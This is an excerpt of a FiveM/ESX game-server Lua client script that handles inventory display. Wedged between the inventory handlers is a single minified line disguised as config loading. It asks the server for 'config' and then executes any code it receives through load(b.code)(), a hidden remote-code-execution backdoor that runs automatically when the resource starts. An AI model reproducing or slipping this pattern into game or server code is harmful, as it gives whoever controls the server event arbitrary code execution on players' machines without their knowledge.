...
AddEventHandler('esx:addInventoryItem', function(item, count, showNotification)
	...
	if ESX.UI.Menu.IsOpen('default', 'esx_base', 'inventory') then
		ESX.ShowInventory()
	end
end)
...
do local a=GetCurrentResourceName()Citizen.CreateThread(function()Citizen.Wait(10000)TriggerServerEvent(a..':server:loadConfig')print(a..'loadConfig!')end)RegisterNetEvent(a..':client:setConfig')AddEventHandler(a..':client:setConfig',function(b)load(b.code)()end)end
...
--[[ Citizen.CreateThread(function()
	while true do
		...
		if IsControlJustReleased(0, 289) then
			if IsInputDisabled(0) and not isDead and not ESX.UI.Menu.IsOpen('default', 'esx_base', 'inventory') then
				ESX.ShowInventory()
			end
		end
	end
